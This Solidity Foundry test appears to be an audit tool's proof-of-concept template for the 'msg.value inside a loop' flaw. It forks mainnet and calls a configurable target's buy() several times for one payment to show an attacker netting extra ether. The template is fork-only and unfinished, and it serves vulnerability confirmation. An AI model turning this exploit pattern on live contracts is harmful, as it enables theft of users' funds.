// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import {Test, console} from "forge-std/Test.sol";

/// @title Fallback PoC -- msg.value used inside a loop
/// @notice Detector: msg-value-loop. The target references msg.value inside
///         a loop -- e.g. paying / refunding msg.value PER ITERATION instead
///         of once. One call with n iterations then pays out n x msg.value.
/// @dev FORK-ONLY. Copy to foundry/test/Exploit.t.sol and run via
///      scripts/run-fork-poc.sh. TODO: adapt buy() / the iteration count /
///      the per-item price to the target.

interface IVictim {
    function buy(uint256 n) external payable;
}

contract PoC is Test {
    address public target;
    uint256 public forkBlock;
    // TODO: the per-item price the target charges.
    uint256 public constant PRICE = 0;

    function setUp() public {
        target = vm.envOr("POC_TARGET", address(0));
        require(target != address(0), "POC_TARGET not set");
        forkBlock = vm.envOr("POC_FORK_BLOCK", uint256(0));
        string memory rpc = vm.envOr("POC_RPC_URL", string("mainnet"));
        uint256 forkId = forkBlock == 0 ? vm.createFork(rpc) : vm.createFork(rpc, forkBlock);
        vm.selectFork(forkId);
    }

    function test_forkSanity() public {
        assertGt(target.code.length, 0, "target has no code at this fork block");
    }

    function test_exploit() public {
        require(PRICE > 0, "set PRICE to the per-item price");

        address attackerEOA = makeAddr("attacker");
        vm.deal(attackerEOA, 10 ether);

        uint256 attackerBefore = attackerEOA.balance;
        // One call, n = 3, paying for ONE item. If the loop pays/refunds
        // msg.value per iteration, the caller nets extra value.
        vm.prank(attackerEOA);
        IVictim(target).buy{value: PRICE}(3);
        uint256 attackerAfter = attackerEOA.balance;

        // Attacker paid PRICE once; if the loop paid out per iteration,
        // the attacker's net outflow is less than PRICE (or they gained).
        console.log("attacker balance before:", attackerBefore);
        console.log("attacker balance after:", attackerAfter);
        assertGt(
            attackerAfter,
            attackerBefore - PRICE,
            "exploit did not reproduce: no per-iteration msg.value leak"
        );

    }
}
